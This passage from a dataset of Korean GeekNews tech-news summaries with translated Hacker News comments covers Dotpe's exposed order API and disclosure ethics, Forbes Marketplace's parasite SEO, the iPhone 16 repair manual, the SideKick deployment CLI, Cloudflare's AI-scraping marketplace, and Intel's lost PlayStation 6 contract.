     * 개인정보를 결합하면 누구나 타인의 식습관 추적 가능, 데이터 판매 가능성도 우려됨
     * API가 무방비로 노출된 것은 의도적인 결정이거나 Dotpe의 무관심 때문으로 보임

GN⁺의 의견

     * Dotpe가 수집하고 있는 데이터의 규모와 민감도가 상당히 우려됨. 개인의 식습관과 관련된 정보는 프라이버시 침해 소지가 큼
     * 누구나 전국의 레스토랑 매출 정보에 접근할 수 있다는 점도 기업의 영업기밀 보호 측면에서 문제
     * 비슷한 서비스를 제공하는 스윙기, 조마토 등은 보안에 더 신경쓰고 있는 것으로 보임. Dotpe도 API 접근통제와 인증을 강화할 필요가 있어 보임
     * QR코드 기반 비대면 주문 서비스 이용시 개인정보 수집 범위와 데이터 활용에 대해 주의깊게 살펴볼 필요 있음
     * 데이터 프라이버시 규제가 강화되고 있는 만큼 Dotpe의 관행은 규제 당국의 주목을 받을 가능성 높음. 선제적 대응이 필요해 보임

   중국에는 QR코드가 예전부터 엄청 범용적으로 사용되는걸로 알고 있습니다.
   그래서 은근슬쩍 가서 가게 메뉴판 QR코드를 자기 QR로 바꿔놓는 식의 범죄가 많다고 들었어요. (QR코드만으로는 그게 무슨 제품을 의미하는지 누구것인지 구분을 못하니까)
   그런데 이런식으로 아예 엔드포인트까지 노출되고 아무나 접근이 가능한 것은 또 처음 듣네요. 재밌었습니다.

   원글이 삭제 되었네요. 근데 웹 아카이브엔 다 남아있군요
   https://archive.is/Z7eIg

        Hacker News 의견

     * Dotpe의 취약점을 공개하기 전에 비공개로 알리는 것이 윤리적 표준임
          + 취약점을 공개하기 전에 회사에 경고하면 문제를 해결할 기회를 줌
          + 회사가 대응할 시간을 주지 않으면 소규모 사업체에 피해를 줄 수 있음
     * 최고 주문 경험은 종이 메뉴와 웨이터를 통한 주문임
          + 테이블에서 모두가 휴대폰을 만지작거리는 것보다 종이 메뉴와 웨이터가 더 나음
     * 다중 백만 달러 사업의 정확한 매출 데이터를 공개하는 것은 나쁜 생각임
          + QR 메뉴를 사용해본 결과, 몇 번의 클릭으로 음식이 나오는 것이 혁신적임
          + 특히 뛰어난 서비스를 기대하지 않는 장소에서 유용함
     * 기술적 관점에서 흥미롭지만, 취약점의 무책임한 공개는 문제임
          + 인도 정부의 PDPA 법안이 통과되었을 가능성이 있음
          + 무책임한 공개는 법적 문제를 일으킬 수 있음
          + 10년 전 대형 다국적 은행의 주요 취약점을 발견했을 때, 은행에 보고하고 해결될 때까지 비밀로 유지했음
     * 회사에 연락하지 않고 취약점을 공개한 것은 미성숙한 행동임
     * 정부의 버스 예약 시스템에서 유사한 취약점을 발견했음
          + 성별, 나이, 이름, 전화번호 등의 정보를 얻을 수 있었음
          + 이를 웹사이트 지원 이메일과 주 사이버 셀에 보고했음
          + 7년이 지난 지금도 그 취약점이 여전히 존재함
     * 일상 생활에서 QR 코드를 스캔하는 것을 좋아함
          + Burger King에서 음료 리필 제한을 QR 코드로 구현하는 방식을 발견했음
          + QR 코드의 타임스탬프를 변경하여 무한 리필을 가능하게 할 수 있는지 궁금함
     * AT&T의 공공 가입자 데이터를 이용해 감옥에 간 사례가 있음
          + 미디어가 이를 해킹이라고 부른 것이 도움이 되지 않았음
"
"https://news.hada.io/topic?id=16848","Forbes Marketplace - 숙주를 먹어치우려는 기생 SEO 회사의 진실","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Forbes Marketplace - 숙주를 먹어치우려는 기생 SEO 회사의 진실

     * 검색 결과에 Forbes가 너무 많이 표시 되지 않나요?
     * Forbes는 반려동물 보험, CBD(대마초 추출 성분) 젤리, 바퀴벌레 퇴치법 등 다양한 주제에서 구글 검색 결과 상위권을 차지하고 있음
          + ""CBD 젤리""의 경우 대마초 카테고리라서 PPC 광고도 전혀 보이지 않지만, 최상위 랭크에 Forbes가 나옴
          + 1위 말고 4위에도 Forbes 링크가 있음. 아마도 이 두 링크만으로 월 1억원($100K)이상 벌고 있을 것
     * 이는 우연이 아니며, Forbes가 2020년 이후 구글 검색을 지배하고 있음을 보여줌

Forbes Marketplace - 역대 최대 규모의 Parasite(기생) SEO 사례

     * Forbes와 전혀 관계 없는 회사가 Forbes와 제휴를 맺고 SEO 어필리에이트 비즈니스를 운영
     * 둘은 아예 새로운 회사를 만들고 Forbes의 일부인 것 처럼 보이게 만들고, 구글의 구석구석을 파고들기 시작
     * 공개적으로는 스스로를 Forbes Advisor라고 부르지만 공식적인 실체는 ""Forbes Marketplace"" 임
     * Forbes Marketplace는 Forbes 웹사이트의 일부 섹션을 운영하며 모든 관련 카테고리를 공략하고 있음
          + forbes.com/advisor/: 4년만에 월 검색 방문자 수 2천만 명 이상으로 성장 시킴. 이게 그들이 운영한 첫번째 섹션
          + forbes.com/home-improvement/: 월 검색 방문자 수 290만 명
          + forbes.com/health/: 월 검색 방문자 수 380만 명
          + 그들이 운영하는 총 월 검색 방문자 수는 2,730만 명에 달함
     * 2009년에 창업한 Nerdwallet의 전체 사이트 월 검색 방문자 수는 1,400만 명인데, Forbes Marketplace는 이미 Nerdwallet의 두 배 규모에 달함
          + 위 데이터는 Ahrefs의 데이터로 완벽하게 정확하지는 않지만 전체적인 규모는 비슷할 것으로 예상
     * 여기서 멈추지 않음: 그들은 지난 2년간 Forbes Betting(스포츠 베팅)을 만들어 왔고 월 455K 방문자수에 도달
          + 그들의 SEO 전략가 채용공고에 따르면 그들은 ""NFL, NBA, MLB, MLS 등과 관련된 모든 것을 위한 최고의 Organic 사이트""를 만들고자 한다고 함
     * Forbes Marketplace는 역대 최대 규모(그리고 가장 성공적인) 기생 SEO 프로그램임
          + 구글이 이를 중단하지 않는한 그들은 모든 어필리에이트 카테고리를 공략할 것으로 보임
          + Forbes가 곧 Viagra 콘텐츠를 홍보하기 시작하더라도 놀랍지 않을 것
     * 이 어필리에이트 프로그램이 너무 성공적이어서 Forbes Marketplace가 Forbes 인수를 추진 중임

Forbes Marketplace 와 Forbes 사이의 관계

     * 2018년에 Forbes Marketplace에 Forbes가 $1,757,000(23억원)으로 투자해서 지분을 매입
     * Forbes는 공식적으로 Forbes Marketplace에 상표 사용권을 부여
     * Forbes는 Forbes Marketplace 이사회에서 한 자리를 차지
     * Forbes의 대주주도 Forbes Marketplace에 투자하고 이사회 자리도 얻었음
     * 전체적으로 Forbes는 Forbes Marketplace의 이사회 자리 두 자리를 지배
     * Forbes는 처음에는 Forbes Marketplace의 지분 20%를 소유했지만 일부 지분 희석 후 대주주로부터 추가 지분을 매입하여 총 소유 지분이 39.53%로 늘어남

Forbes Marketplace 운영 주체는 누구일까? : Marketplace Platforms Limited

     * Forbes가 이 콘텐츠를 게시하고 모든 수익을 가져간다고 생각할 수 있지만 그렇지 않음
     * Forbes Advisor라는 이름으로 대외적으로 활동하지만, 실제 법인은 Forbes Marketplace Holdings Limited임
     * 이 회사의 실질적인 운영은 Marketplace Platforms Limited에서 하고 있음
          + CEO는 Ash Rahimi
          + Content VP - Katie Doyle, Product SVP - Sal Cangeloso, BD VP Dave Ownio, CHRO - Ashleigh Butson, Organic Growth VP - Jonathan Jones
          + 등기 임원으로는 Tom Callahan(CFO)과 Chris Thermistocleous(Marketing)가 있음
     * Forbes는 소수 지분만 보유하고 있으며, 이사회 의석 2개를 확보하고 있음
     * 창업 멤버 중 한 명인 Achir Kalra가 최근 회사를 떠남. 그가 공개한 내용에 따르면:
          + (돈을 트럭으로 버는 회사에서 왜 그만두는지 궁금했는데, 퇴사하면서 그가 링크드인에 수많은 내용을 공개하고 바로 삭제한 걸 취득함)
          + Achir Kalra는 Forbes Marketplace 설립에 참여했고, 그전엔 Forbes에 근무
          + Tom Callahan, Namit Merchant, Shaifali Sharma 등이 주요 투자자이자 경영진
          + 가장 중요한 것은 ""2024년 Forbes Marketplace 가 Forbes 를 사려고 입찰을 진행중 이라는 것""
               o Forbes 어필리에이트 프로그램이 너무 성공적이어서 기생하는 SEO회사가 Forbes 자체를 삼키려한다는 것

Forbes Marketplace의 연 매출 추정치 - 3억~4억 달러(4000~5000억원)

     * 2021년 1월~9월 매출이 $22m(300억원)였음. 2021년 전체 매출은 $29m(390억원)로 추정
     * 2021년 월 평균 검색량은 340만이었음
     * 현재 월 검색량은 2,770만으로, 2021년 대비 8배 증가
     * 비례 계산 시 현재 연 매출은 2억 3,600만 달러로 추정되나, 실제로는 3억~4억 달러에 이를 것으로 추정됨

Parasite SEO가 문제가 되는 이유

     * 구글 자체 스팸 정책에 따르면 제3자 페이지가 호스트 사이트의 주요 목적과 무관하게 게시되거나 감독 없이 제작되는 것은 ""Site Reputation Abuse""에 해당함
     * Forbes Marketplace는 사실상 별개의 회사이며 Forbes는 소수 지분만 보유
     * Forbes가 실질적인 통제권을 행사하기 어려운 구조
     * 5년도 안 되는 기간 내 신용카드, 바퀴벌레, CBD, 스포츠 베팅 등 다양한 주제의 전문성을 확보하기는 어려움
     * 구글 검색 순위 향상을 위한 얇고 일반적인 콘텐츠를 대량 생산하는 것으로 보임

진정한 악당은 구글

     * Forbes Marketplace 팀에 대해 악의는 없음
     * SEO 전문가로서 그들이 이룬 성과에 경의를 표함
          + 이상적인 도메인과 제휴했고, 구글이 SEO 업계에 엄청난 변화를 일으키는 동안 거대 미디어 사이트를 상위에 노출시키는 혜택을 누림
          + 완벽한 실행과 일생 일대의 행운이 겹침
     * 인상적이며, 약간의 질투심마저 듦
     * 결국 그들의 직원들은 자신의 일을 하는 것일 뿐임
     * 하지만 구글에 대해서는 큰 불만이 있음
          + 구글은 Forbes를 모든 분야의 권위자로 인정하고 있음
          + 신용카드, 바퀴벌레 퇴치, CBD 젤리 등 거의 모든 분야에서 Forbes가 지배적임
          + 이는 말도 안 되는 일임
     * 이는 단순한 실수가 아님. 2022년에도 이미 황당한 일이었음
          + B2B 검색어를 면밀히 관찰했는데, Forbes가 모든 곳에 나타나기 시작함
          + 당시에는 이게 도를 넘었다고 생각했고, 구글이 이를 제한해야 한다고 봄
     * 그 이후 Forbes Marketplace는 건강, 주택, 스포츠 카테고리까지 장악하기 위해 사업부를 출범시킴
          + 그들은 계속 이기고 있으며, 구글이 나서지 않는 한 계속 이길 것임
     * SEO 업계의 많은 사람들을 알지만, 그 누구도 이것이 정상이라고 생각하지 않음
          + 구글 직원들조차 내부적으로 Forbes에 대해 불평하고 있다는 얘기를 신뢰할 만한 소식통으로부터 들음
          + 그런데 2년이 지나도 아무것도 변하지 않았음
     * 오히려 구글은 HCU 알고리즘을 계속 적용해 틈새 사이트와 소형 사이트를 궤멸시키고 있음
     * 가장 끔찍한 것은 이 모든 일이 구글의 고의적인 결정이 아니라는 점
          + 검색 순위가 그들의 통제를 벗어났다고 봄
          + 구글이 더 이상 자체 순위나 알고리즘을 통제하지 못하고 있음
          + 많은 리더들이 과도한 권력을 갖고 있고, SERP가 너무 복잡해졌으며, AI가 검색팀 전체에 엄청난 혼란을 주고 있음
     * 이는 엉망진창인 결과물을 내놓기에 완벽한 조합
     * 이제 우리는 매일 이 엉망진창을 헤쳐 나가야 함

   요근래 몇년간 구글 검색 품질의 질이 많이 떨어졌음에도, 구글 외에는 대안이 마땅찮았는데... 요즘은 궤를 달리하지만 제가 사용하는 용도에서는 ChatGPT가 구글 검색으로 해결하던 업무의 50% 이상을 가져가 버렸습니다.

   이제는 검색의 질이 올라 간다고 해서 전통적인 구글 검색으로 다시 돌아가지 않을것 같습니다.

   왜 순다피차이가 구글의 미래에 대해 크게 우려 했는지 알것 같습니다.

  Hacker News 의견

     * Google은 광고 네트워크가 되면서 스스로를 망침. 두 가지 다른 기반(광고주와 사용자)을 동시에 만족시키려다 모두에게 불만을 사게 됨. Google이 분할되면 전 세계가 환영할 것임
     * 3-5년마다 HowStuffWorks, About.com, LiveStrong.com 같은 사이트들이 갑자기 두드러짐
          + CNN 같은 사이트도 서브도메인을 통해 제3자가 관리하는 제휴 제안을 사용함.
          + Google은 작은 도메인의 발견 가능성에 크게 신경 쓰지 않음.
     * Forbes가 클릭을 위해 본질을 잃었음. 과거에는 상위 비즈니스 잡지였으나, 현재는 편향된 블로그 글과 광고성 콘텐츠가 많아짐.
     * Kagi 검색에서는 특정 도메인을 검색 결과에서 차단할 수 있음. Forbes를 가장 먼저 차단
     * Google이 기생 SEO를 방치하는 이유가 불분명함. Forbes가 전문성을 넘어서는 콘텐츠를 확장하는 것이 이상함
     * 상위 도메인을 소유한 몇몇 미디어 회사가 SEO를 스팸으로 사용함.
     * Forbes뿐만 아니라 CNN, USA Today 같은 전통 미디어도 유사한 전략을 사용함. Google이 전통 미디어와의 관계 때문에 이를 방치하는 것일 수 있음.
     * ""2021년에 월 평균 3.4M 검색으로 연간 $29M의 수익을 올림"". 검색당 거의 $1의 수익을 올리는 것이 미친 것처럼 보임
"
"https://news.hada.io/topic?id=16878","애플, iPhone 16 및 iPhone 16 Pro 수리 매뉴얼 공개","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                애플, iPhone 16 및 iPhone 16 Pro 수리 매뉴얼 공개

     * iPhone 16/Plus/Pro/Pro Max에 대한 수리 설명서 제공
     * 전자 기기 수리에 필요한 ""지식, 경험 및 도구""를 갖춘 ""개별 기술자""를 대상으로 순정 Apple 부품을 교체하기 위한 기술적 지침을 제공
     * Apple은 수리에 필요한 도구에 대한 지원 문서를 가지고 있는데, iPhone 16용 도구는 아직 Apple의 자가 수리 웹사이트에서 사용할 수 없지만 곧 추가될 것으로 보임
     * 이전 iPhone 모델에 비해 iPhone 16과 iPhone 16 Plus의 수리가 더 쉬워짐
          + Apple은 전기 배터리 제거 프로세스를 사용하고 있음
          + 9볼트 배터리와 9볼트 배터리 클립을 iPhone 16 배터리에 적용하여 배터리를 고정하는 접착제를 제거할 수 있음
          + 이 전기 기반 배터리 제거 프로세스는 iPhone 16 및 iPhone 16 Plus만 적용
          + iPhone 16 Pro 및 Pro Max의 경우 조심스럽게 당겨 배터리를 분리해야 하는 표준 접착 탭을 사용
     * 배터리 수리에 대한 지침에는 교체 배터리를 제자리에 놓기 위한 iPhone 배터리 프레스와 같은 고가의 장비가 포함됨
          + 장치 수리에 필요한 도구 비용과 정품 부품 비용으로 인해 자가 수리는 Apple 소매점이나 Apple 공인 서비스 제공업체에서 수리를 받는 것만큼 비용이 많이 듦
          + 그래서 이 설명서는 개별 소비자보다는 독립 수리점을 대상으로 함
     * 애플은 iPhone 16 모델의 수리 가능성 향상을 위한 여러 변경을 했음
          + Face ID 카메라에 대한 장치 내 구성 활성화
          + LiDAR 스캐너 수리 허용
          + iPhone 16과 iPhone 16 Pro 모델 간 TrueDepth 카메라 모듈 교환 지원
     * Apple의 설명서는 장치 분해가 이루어질 때까지 종종 볼 수 없는 새로운 iPhone의 내부 구조에 대한 인사이트를 제공함
          + iPhone 16 Pro는 열 문제로 인해 배터리용 금속 케이싱을 가지며, 두 Pro 모델 모두 열 방출을 개선하는 새로운 케이싱 구조 적용

GN⁺의 의견

     * iPhone 16 시리즈의 수리 용이성 개선은 사용자와 수리점 모두에게 좋은 소식임
     * 새로운 전기 기반 배터리 제거 프로세스는 iPhone 16과 16 Plus의 배터리 교체를 더 쉽고 안전하게 만듦
     * 그러나 자가 수리에 필요한 고가의 도구와 정품 부품으로 인해 여전히 대부분의 소비자에게는 현실적이지 않음
     * Apple의 자가 수리 프로그램은 주로 독립 수리점을 대상으로 하지만, 장기적으로는 소비자에게도 더 많은 선택권을 제공할 수 있음
     * 업계의 다른 스마트폰 제조사들도 Apple의 이러한 움직임을 따라 제품의 수리 가능성을 개선하고 자가 수리 옵션을 제공하는 것이 좋겠음
"
"https://news.hada.io/topic?id=16850","SideKick - 명령어 2개로 어떤 앱이든 VPS에서 셀프호스팅하게 해주는 CLI 도구 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           SideKick - 명령어 2개로 어떤 앱이든 VPS에서 셀프호스팅하게 해주는 CLI 도구

     * 베어메탈에서 프로덕션까지 몇분만에 준비. ""내 VPS에서 실행하는 fly.io""
     * 명령 하나로 VPS 셋업(docker, traefik, sops, age)
     * Docker파일로 어떤 앱이든 디플로이(Zero Downtime)
     * HA & 로드밸런싱
     * SSL Cert 자동 설정

사용 방법

     * VPS 셋업 : sidekick init
          + IP 주소 입력
          + SSL 인증서 처리할 이메일 주소 입력
          + 도커 이미지 호스팅할 레지스트리(기본값 docker.io)
          + 해당 도커 레지스트리의 사용자명
          + 해당 레지스트리에 로그인 되어있는지 확인
          + 여기까지 입력하면 그다음에 2분간 작업 진행
               o 루트로 로그인해서 sidekick 사용자 만들고 로그인
               o 우분투 시스템 업그레이드
               o sops 설치, age로 키 생성
               o 도커 설치
               o Traefik과 SSL 인증서 설정
     * 어플리케이션 실행 : sidekick launch
          + 앱 이름 입력(URL 친화적인)
          + 앱이 요청을 받을 HTTP 포트
          + 도메인 명
          + 이 다음에 2분 정도 작업 진행
               o 리눅스 도커이미지 생성하고 레지스트리에 푸시
               o env 파일 암호화 하고 푸시
               o sops 로 env 디스크립트
               o docker compose로 도커 이미지 실행하고 Traefik 으로 지정 포트로 트래픽 포워딩
     * 새 버전 디플로이 : sidekick deploy
     * 프리뷰 버전 디플로이 : sidekick deploy preview
"
"https://news.hada.io/topic?id=16906","Cloudflare의 새로운 마켓플레이스, 웹사이트가 AI 스크래핑 봇 에 요금 부과 가능","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           Cloudflare의 새로운 마켓플레이스, 웹사이트가 AI 스크래핑 봇 에 요금 부과 가능

     * Cloudflare는 웹사이트 소유자가 AI 모델 제공자에게 사이트 콘텐츠 스크래핑 접근을 판매할 수 있는 마켓플레이스를 내년에 출시할 계획을 발표함
     * 이 마켓플레이스는 Cloudflare CEO Matthew Prince의 더 큰 계획의 마지막 단계로, 퍼블리셔들이 AI 봇이 웹사이트를 스크래핑하는 방법과 시기를 더 잘 통제할 수 있도록 함
     * 그 첫 단계로 Cloudflare는 무료 observability 도구인 AI Audit을 출시함
          + 웹사이트 소유자는 AI 모델이 사이트를 얼마나 자주 스크래핑하는지에 대한 분석을 볼 수 있는 대시보드를 제공받음
          + AI Audit을 통해 웹사이트 소유자는 AI 봇을 차단하거나 특정 웹 스크래퍼를 허용할 수 있음
          + AI Audit 데모는 웹사이트 소유자가 각 스크래퍼가 어디서 오는지 확인할 수 있게 하며, OpenAI, Meta, Amazon 등의 AI 모델 제공자가 사이트를 얼마나 자주 방문하는지 볼 수 있는 선택적 창을 제공함
     * AI 산업의 문제 해결
          + AI 모델 제공자들이 수천 개의 작은 웹사이트를 스크래핑하여 LLM을 구동하는 정보로 사용함
          + 대부분의 웹사이트는 아무런 보상을 받지 못하고, 이는 많은 웹사이트의 비즈니스 모델을 깨뜨릴 수 있음
          + Cloudflare는 웹사이트 소유자가 AI 봇을 차단할 수 있는 버튼을 출시함
     * 고객 요구 사항 반영
          + Cloudflare의 고객들은 어떤 AI 모델이 사이트에 접근할 수 있는지 선택할 수 있는 도구를 요구함
          + Cloudflare의 새로운 도구는 일부 AI 크롤러를 차단하면서 다른 크롤러는 허용할 수 있게 함
     * 마켓플레이스의 목표
          + Cloudflare의 마켓플레이스는 작은 퍼블리셔들이 AI 모델 제공자와 거래를 할 수 있게 함
          + 웹사이트가 스크래핑 요금을 설정하거나 AI 연구소에 크레딧을 요청할 수 있음
     * AI 생태계에 미치는 영향
          + 현재 일부 AI 회사들이 콘텐츠에 대해 아무런 비용을 지불하지 않는 상황은 지속 가능하지 않음
          + Cloudflare의 CEO는 이 마켓플레이스가 AI 생태계에 궁극적으로 좋을 것이라고 생각함

GN⁺의 정리

     * Cloudflare는 웹사이트 소유자가 AI 모델 제공자에게 사이트 콘텐츠 스크래핑 접근을 판매할 수 있는 마켓플레이스를 출시할 계획을 발표함
     * AI Audit 도구를 통해 웹사이트 소유자는 AI 모델이 사이트를 얼마나 자주 스크래핑하는지 분석할 수 있음
     * 이 마켓플레이스는 작은 퍼블리셔들이 AI 모델 제공자와 거래를 할 수 있게 하여, 콘텐츠에 대한 보상을 받을 수 있도록 함
     * 이는 AI 생태계의 지속 가능성을 높이는 데 기여할 수 있음

   취지는 좋군요

        Hacker News 의견

     * Common Crawl은 OpenAI와 Antropic과 함께 ""Providers"" 목록에 포함됨
          + Common Crawl은 AI 훈련 외에도 다양한 용도로 사용됨
          + Wayback Machine의 주요 콘텐츠 소스임
          + Common Crawl 프로젝트의 목적은 여러 회사가 개별적으로 크롤러를 운영하는 대신, Common Crawl이 데이터를 수집하고 표준 형식으로 제공하는 것임
          + CloudFlare가 콘텐츠 접근을 제한하면 큰 영향을 미칠 수 있음
          + 대부분의 웹사이트가 보안 제품을 사용하여 접근을 제한하는 세상이 올 수 있음
     * OpenFoodFacts와 OpenStreetMap, Wikipedia는 DDoS 공격을 받음
          + 무료로 데이터를 다운로드할 수 있음에도 불구하고 봇이 모든 것을 스크랩함
          + 이로 인해 불필요한 트래픽이 발생하고 비용이 증가함
          + 이는 저작권 문제가 아니라 봇의 비효율성과 운영자의 무관심 때문임
          + 해결책이 필요함
     * 크롤링을 방지하는 것은 무의미한 작업일 수 있음
          + 이 기능은 이미 많은 데이터를 크롤링한 대형 플레이어를 더욱 강화할 수 있음
          + 잘못된 긍정과 과도한 캡차로 인해 사용자에게 영향을 미칠 수 있음
     * Cloudflare는 새로운 방식으로 남용으로부터 보호하는 서비스를 제공함
          + Cloudflare는 남용자와 협력하여 ""마켓플레이스""를 형성함
          + Cloudflare의 서비스를 사용하지 않으면 남용이 계속될 것임
          + 이는 보호비를 요구하는 행위와 유사할 수 있음
     * 월드 와이드 웹의 미래에 대한 의문
          + 영원히 지속될 것 같았지만, 언젠가는 IRC처럼 사라질 수 있음
          + 황금기는 이미 지나갔고, ""AI""는 끝의 시작일 수 있음
     * Cloudflare 블로그에서 더 많은 세부 정보를 확인할 수 있음
          + AI Audit의 데모는 웹사이트 소유자가 AI 모델이 사이트를 어떻게 스크랩하는지 볼 수 있게 함
          + OpenAI, Meta, Amazon 등의 스크래퍼가 사이트를 방문한 횟수를 볼 수 있음
     * AI Audit를 사용한 Bingeclock의 예시
          + Cloudflare의 발표 이후 48시간 동안의 흥미로운 변화
          + 결제 프로그램은 흥미롭지만, 트래픽 감소로 인해 웹사이트가 비효율적으로 될 수 있음
          + AI 스크래퍼는 최소한의 결제만 할 가능성이 높음
     * 다음 단계: 생성형 AI를 사용하여 콘텐츠를 생성하고, Cloudflare가 이를 스캔할 때 결제를 받음
     * 동일한 사이트를 반복적으로 스크랩하는 것은 큰 낭비임
          + Cloudflare가 변경 사항과 업데이트를 관리할 수 있다면 많은 자원을 절약할 수 있음
          + 사이트가 Cloudflare에 변경 사항을 직접 알리고, Cloudflare가 AI에 이를 전달함
          + AI가 변경 사항을 구매하고, Cloudflare가 사이트에 결제하고 마진을 유지함
"
"https://news.hada.io/topic?id=16810","인텔은 Sony Playstaion 6 계약을 어떻게 AMD에 뺏겼나 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 인텔은 Sony Playstaion 6 계약을 어떻게 AMD에 뺏겼나

     * 인텔은 2022년 소니의 플레이스테이션 6 칩 설계 및 제조 계약을 AMD와 TSMC에 뺏겼음
     * 이 계약은 수십억 달러의 매출과 매월 수천 개의 실리콘 웨이퍼 제조에 해당하는 규모였음
     * 인텔과 AMD는 플레이스테이션 6 칩 계약의 최종 경쟁자였음

인텔의 파운드리 사업에 큰 타격

     * 플레이스테이션 6 칩 설계 사업 수주는 인텔의 설계 부문과 파운드리 사업에 큰 승리가 될 수 있었음
     * 인텔 CEO 팻 겔싱어는 2021년 인텔의 파운드리 사업 계획을 발표하고 2023년 2월 캘리포니아 산호세에서 정식 출범했음
     * 플레이스테이션 칩 계약은 인텔의 설계 부문에서 시작되었지만, 올해 사업부 분리 후 파운드리 사업의 재정 실적에 큰 도움이 될 수 있었음

인텔이 소니와의 계약을 놓친 세부 사항

     * 인텔은 소니에 판매되는 각 칩에서 얻을 수 있는 이익 분배 문제로 소니와 가격 협상에 실패했음
     * 결국 AMD가 브로드컴 등 경쟁사를 제치고 계약을 따냈음
     * 소니와 인텔의 협상은 2022년 수개월 동안 지속되었으며, 양사 CEO를 비롯한 수십 명의 엔지니어와 임원이 참여했음

인텔의 입장

     * 인텔 대변인은 Reuters 보도에 강하게 반대한다고 밝혔음
     * 고객과의 대화에 대해서는 언급하지 않겠다고 함
     * 제품 및 파운드리 사업 모두 건전한 고객 파이프라인을 가지고 있으며, 고객의 요구 사항을 충족시키는 데 주력하고 있다고 말함

플레이스테이션의 하위 호환성 문제

     * 현재 세대 플레이스테이션 콘솔은 AMD가 설계한 맞춤형 칩으로 구동됨
     * 소니는 지난주 플레이스테이션 5 Pro를 발표했지만, 차세대 모델은 아직 공개하지 않았음
     * 2023 회계연도에 2,080만 대의 1세대 플레이스테이션 5를 판매했다고 밝힘
     * 콘솔 칩 설계는 이전 버전과의 호환성을 보장하려고 노력함
     * AMD에서 인텔로 전환하면 하위 호환성에 위험이 있을 수 있음
     * 플레이스테이션 사용자가 구버전용으로 구매한 게임을 플레이할 수 있도록 하는 것은 소니가 차세대 시스템에 포함하는 중요한 기능임

인텔의 어려운 상황

     * 인텔은 엔비디아와 AMD가 주도하는 AI 붐의 첫 물결을 놓쳤음
     * 8월 실망스러운 2분기 실적을 보고했음
     * 인공지능 칩과 같은 제품의 총 마진은 50% 이상이지만, 콘솔 사업은 이보다 낮은 이익을 가져다 줌
     * 그러나 콘솔 사업은 이미 개발된 기술로 수익을 낼 수 있는 안정적인 사업임
     * 소니의 사업은 인텔의 파운드리 사업 신규 고객 유치에 도움이 될 수 있었음

인텔 이사회의 갈등

     * 인텔의 미래에 대한 의견 차이로 고위 이사회 멤버인 Lip-Bu Tan이 갑작스럽게 사임한 것은 인텔에 큰 타격임
     * 팻 겔싱어 CEO와 다른 임원들은 지난주 이사회 회의에서 계획을 발표했음
     * 더 이상 운영할 여력이 없는 사업을 줄이는 방안 등이 논의될 것으로 보임
     * 프로그래밍 가능한 칩 사업부인 Altera의 매각 가능성과 독일 제조 확장 계획 등도 토론될 예정임

인텔 파운드리 사업의 어려움

     * 인텔은 겔싱어 재임 기간 동안 설계와 제조 사업을 분리했음
     * 올해 1분기부터 별도로 재무 실적을 보고하고 있음
     * 4월 제조 사업에서 70억 달러의 영업 손실을 공개했음
     * 다른 회사에 개방된 18A 공정에 대해 공개적으로 언급할 수 있는 주요 고객을 찾는 데 어려움을 겪고 있음
     * 플레이스테이션 6 칩을 수주했다면 5년 이상 파운드리 사업을 지탱할 수 있었을 것임
     * 인텔의 내부 전망에 따르면 소니와의 장기 계약으로 약 300억 달러의 매출이 발생할 수 있었음

GN⁺의 의견

     * 플레이스테이션은 전 세계적으로 가장 인기 있는 게임 콘솔 중 하나로, 차세대 모델의 칩 공급 계약은 반도체 업계에서 큰 의미가 있음
     * 인텔은 새로운 CEO 체제 하에 파운드리 사업 진출 등 변화를 모색하고 있지만, 소니와의 계약 실패는 큰 타격이 될 것으로 보임
     * 반면 AMD는 Xbox와 플레이스테이션 등 주요 게임 콘솔 칩 공급을 독점하며 시장에서의 입지를 더욱 공고히 했음
     * 향후 고성능 컴퓨팅 시장에서 AMD의 성장세가 더욱 두드러질 것으로 예상됨
     * 인텔로서는 설계 역량 강화와 함께 파운드리 경쟁력 제고를 위한 전략적 노력이 필요해 보임. 삼성전자, TSMC 등 경쟁사 대비 차별화된 공정 기술 개발이 관건이 될 것임

   해커 뉴스 의견에도 나와있듯이 누가 제목만 보면 PS4 PS5에 인텔 APU가 들어가 있는 줄 알겠어요. 원 저자의 제목 낚시 의도가 느껴집니다

        Hacker News 의견

     * Intel이 신뢰할 수 있는 대체 공급업체로 입찰하는 중요한 메타 게임이 언급되지 않음
          + Intel은 입찰을 통해 AMD의 이익을 줄일 수 있음
          + Sony는 AMD와 더 나은 거래를 하기 위해 Intel을 대안으로 사용할 수 있음
          + 과거에도 AMD가 Nvidia를 견제하기 위해 비슷한 전략을 사용했음
     * 게임 개발자로서의 관점
          + Sony와 Nintendo가 칩 비용 절감을 위해 하위 호환성을 포기하는 것은 어리석은 일임
          + 벤더를 변경하면 기존 게임의 호환성이 무효화되고 내부 라이브러리 재구성이 필요함
          + 콘솔 게임은 대부분 독점 그래픽 API를 사용하며, 이는 하드웨어에 종속적임
          + 새로운 세대의 콘솔에서도 소프트웨어 투자를 재사용할 수 있었음
     * AMD와 Intel의 입찰은 기존 벤더가 지나치게 탐욕스럽지 않도록 하기 위한 것임
          + 과거 Nvidia의 탐욕이 원래 Xbox의 시장 성장을 방해했음
     * Intel이 이 계약을 따낼 가능성은 낮음
          + AMD는 고성능 APU 경험이 풍부하지만, Intel은 그렇지 않음
          + 현대 고급 콘솔의 칩은 GPU와 경쟁해야 하며, Intel은 이에 대한 적절한 제품이 없음
     * Intel이 Apple과 Sony에게 지나치게 큰 회사임을 인정했음
          + Apple은 ARM을 사용하기로 결정했고, Sony는 AMD를 계속 사용하기로 결정함
     * Intel은 유용한 기능을 제공하려고 하지만, AMD는 이미 이를 제공하고 있음
          + Sony는 구형 및 최신 타이틀을 제대로 실행할 수 없는 프로세서를 원하지 않음
     * AMD는 x86과 강력한 GPU 기술을 모두 제공하는 유일한 기술 회사임
          + 하위 호환성 문제와 Intel의 파운드리 신뢰성에 대한 불확실성 존재
          + 이 계약은 Intel의 파운드리에 PR적으로는 좋았겠지만, 금전적으로는 큰 이익이 아니었음
     * Intel은 원래 Xbox 이후로 콘솔 CPU/GPU를 만들지 않았음
          + AMD는 Gamecube, Wii, Xbox 360 (GPU), Xbox One, PS4, PS5 등을 제작했음
     * 기술 기사에서 모든 것이 AI로 연결되는 것이 신뢰성을 떨어뜨림
          + Nvidia와 AMD가 주도한 첫 번째 AI 붐을 놓친 Intel은 2분기에 큰 손실을 기록했음
